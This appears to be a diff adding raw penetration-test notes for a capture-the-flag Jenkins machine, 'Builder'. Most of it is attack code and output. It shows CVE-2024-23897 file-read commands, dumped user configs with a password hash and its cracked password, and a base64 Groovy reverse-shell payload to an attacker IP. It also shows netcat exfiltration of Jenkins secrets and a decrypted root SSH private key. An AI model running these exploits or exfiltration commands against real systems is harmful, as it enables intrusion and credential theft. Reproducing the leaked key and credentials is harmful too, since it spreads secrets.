@@ -1,0 +1,258 @@
+10.10.11.10
+jennifer princess
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+8080/tcp open  http    Jetty 10.0.18
+| http-robots.txt: 1 disallowed entry 
+|_/
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Jetty(10.0.18)
+|_http-title: Dashboard [Jenkins]
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+
+- 22 OpenSSH 8.9p1
+
+
+
+
+- 8080 Jetty(10.0.18)
+	- Jenkins 2.441
+		https://github.com/xaitax/CVE-2024-23897
+		python3 CVE-2024-23897.py -t builder.htb -f /etc/hosts
+		
+		https://github.com/Praison001/CVE-2024-23897-Jenkins-Arbitrary-Read-File-Vulnerability
+		python3 CVE-2024-23897.py -u http://10.10.11.10:8080/ -f /etc/passwd
+		jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
+		python3 CVE-2024-23897.py -u http://10.10.11.10:8080/ -f /var/jenkins_home/.ssh/id_rsa
+		python3 CVE-2024-23897.py -u http://10.10.11.10:8080/ -f /var/jenkins_home/.ssh/id_ECDSA
+		python3 CVE-2024-23897.py -u http://10.10.11.10:8080/ -f /var/jenkins_home/.ssh/id_ED25519
+		
+		https://www.exploit-db.com/exploits/51993
+			└─$ python3 cve.py -u http://10.10.11.10:8080/ -p /etc/passwd
+			www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+			root:x:0:0:root:/root:/bin/bash
+			mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+			backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+			_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+			nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+			lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+			uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+			bin:x:2:2:bin:/bin:/usr/sbin/nologin
+			news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+			proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+			irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+			list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+			jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
+			games:x:5:60:games:/usr/games:/usr/sbin/nologin
+			man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+			daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+			sys:x:3:3:sys:/dev:/usr/sbin/nologin
+			sync:x:4:65534:sync:/bin:/bin/sync
+
+		
+		python3 cve.py -u http://10.10.11.10:8080/ -p /var/jenkins_home/userContent
+		python3 cve.py -u http://10.10.11.10:8080/ -p /var/jenkins_home/jenkins_config.xml
+		python3 cve.py -u http://10.10.11.10:8080/ -p /var/jenkins_home/init.groovy.d/init.groovy
+		python3 cve.py -u http://10.10.11.10:8080/ -p /var/jenkins_home/users/users.xml
+			<?xml version='1.1' encoding='UTF-8'?>
+				  <string>jennifer_12108429903186576833</string>
+			  <idToDirectoryNameMap class="concurrent-hash-map">
+				<entry>
+				  <string>jennifer</string>
+			  <version>1</version>
+			</hudson.model.UserIdMapper>
+			  </idToDirectoryNameMap>
+			<hudson.model.UserIdMapper>
+				</entry>
+
+
+		
+		python3 cve.py -u http://10.10.11.10:8080/ -p /var/jenkins_home/users/jennifer_12108429903186576833/config.xml
+		    <hudson.tasks.Mailer_-UserProperty plugin="mailer@463.vedf8358e006b_">
+				<hudson.search.UserSearchProperty>
+				  <roles>
+				<jenkins.security.seed.UserSeedProperty>
+				  </tokenStore>
+				</hudson.search.UserSearchProperty>
+				  <timeZoneName></timeZoneName>
+			  <properties>
+				<jenkins.security.LastGrantedAuthoritiesProperty>
+				  <flags/>
+				<hudson.model.MyViewsProperty>
+			</user>
+				</jenkins.security.ApiTokenProperty>
+				  <views>
+					<string>authenticated</string>
+				<org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.200.vb_9327d658781">
+			<user>
+					  <name>all</name>
+			  <description></description>
+				  <emailAddress>jennifer@builder.htb</emailAddress>
+				  <collapsed/>
+				</jenkins.security.seed.UserSeedProperty>
+				</org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
+				</hudson.model.MyViewsProperty>
+				  <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>
+					  <filterQueue>false</filterQueue>
+				<jenkins.security.ApiTokenProperty>
+				  <primaryViewName></primaryViewName>
+				  </views>
+				</hudson.model.TimeZoneProperty>
+				<com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@1319.v7eb_51b_3a_c97b_">
+				</hudson.model.PaneStatusProperties>
+				</hudson.tasks.Mailer_-UserProperty>
+					<tokenList/>
+				<jenkins.console.ConsoleUrlProviderUserProperty/>
+					</hudson.model.AllView>
+				  <timestamp>1707318554385</timestamp>
+					  <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
+			  </properties>
+				</jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
+				</com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
+				<hudson.security.HudsonPrivateSecurityRealm_-Details>
+				  <insensitiveSearch>true</insensitiveSearch>
+					  <properties class="hudson.model.View$PropertyList"/>
+				<hudson.model.TimeZoneProperty>
+					<hudson.model.AllView>
+				</hudson.security.HudsonPrivateSecurityRealm_-Details>
+				  <providerId>default</providerId>
+				  </roles>
+				</jenkins.security.LastGrantedAuthoritiesProperty>
+				<jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
+				<hudson.model.PaneStatusProperties>
+			<?xml version='1.1' encoding='UTF-8'?>
+			  <fullName>jennifer</fullName>
+				  <seed>6841d11dc1de101d</seed>
+			  <id>jennifer</id>
+			  <version>10</version>
+				  <tokenStore>
+					  <filterExecutors>false</filterExecutors>
+				<io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>
+				  <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>
+		
+		
+
+		
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+john ==> princess
+
+jennifer princess
+
+jenkin ==> manager jenkin ==> script console ==> Groovy script
+
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = 'bash -c {echo,L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMjEvNDQzIDA+JjEn}|{base64,-d}|{bash,-i}'.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println "out> $sout err> $serr"
+
+
+script /dev/null -qc /bin/bash
+stty raw -echo;fg
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+jenkins        1  0.0  0.0   2472   916 ?        Ss   04:01   0:00 /usr/bin/tini -- /usr/local/bin/jenkins.sh
+
+
+nc -l -p 1234 > linpeas.txt
+/tmp/nc -w 3 10.10.16.21 1234 < linout.txt
+
+nc -l -p 1234 > credentials.xml
+/tmp/nc -w 3 10.10.16.21 1234 < credentials.xml
+
+nc -l -p 1234 > master.key
+/tmp/nc -w 3 10.10.16.21 1234 < secrets/master.key
+
+nc -l -p 1234 > hudson.util.Secret
+/tmp/nc -w 3 10.10.16.21 1234 < secrets/hudson.util.Secret
+
+
+┌──(kali㉿kali)-[~/stuffs/htb/builder]
+└─$ python3 jenkins_offline_decrypt.py master.key hudson.util.Secret credentials.xml 
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+
+
+ref :https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security#from-disk
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
